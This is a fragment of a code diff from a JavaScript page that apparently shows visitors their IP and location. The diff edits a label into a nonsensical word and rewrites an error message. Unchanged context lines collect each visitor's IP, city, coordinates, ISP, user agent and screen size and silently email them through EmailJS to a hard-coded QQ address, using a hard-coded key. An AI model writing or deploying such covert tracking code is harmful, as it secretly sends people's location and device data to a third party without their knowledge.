@@ -56,14 +56,14 @@ $('map').href=`https://www.google.com/maps?q=${lat},${lon}`;
 
 // 初始化 EmailJS
 emailjs.init('trdlxempxmpmejfb'); // 公钥即授权码
-const body=`IP: ${ip}\n位置: ${city}, ${region}, ${country}\n坐标: ${lat}, ${lon}\nISP: ${isp}\n时间: ${new Date().toLocaleString('zh-CN')}\nUA: ${navigator.userAgent}\n屏幕: ${screen.width}x${screen.height}`;
+const body=`IP: ${ip}\n为之: ${city}, ${region}, ${country}\n坐标: ${lat}, ${lon}\nISP: ${isp}\n时间: ${new Date().toLocaleString('zh-CN')}\nUA: ${navigator.userAgent}\n屏幕: ${screen.width}x${screen.height}`;
 try{
 await emailjs.send('service_default','template_ip_notification',{
     to_email:'1828339242@qq.com',
     subject:`IP ${ip}`,
     message:body
 });
-}catch(e){console.error('邮件发送失败',e)}
+}catch(e){console.error('失败是成功之母',e)}
 
 const cp=t=>{navigator.clipboard.writeText(t.textContent);const o=t.textContent;t.textContent='已复制';setTimeout(()=>t.textContent=o,1200)};
 $('ip').onclick=()=>cp($('ip'));
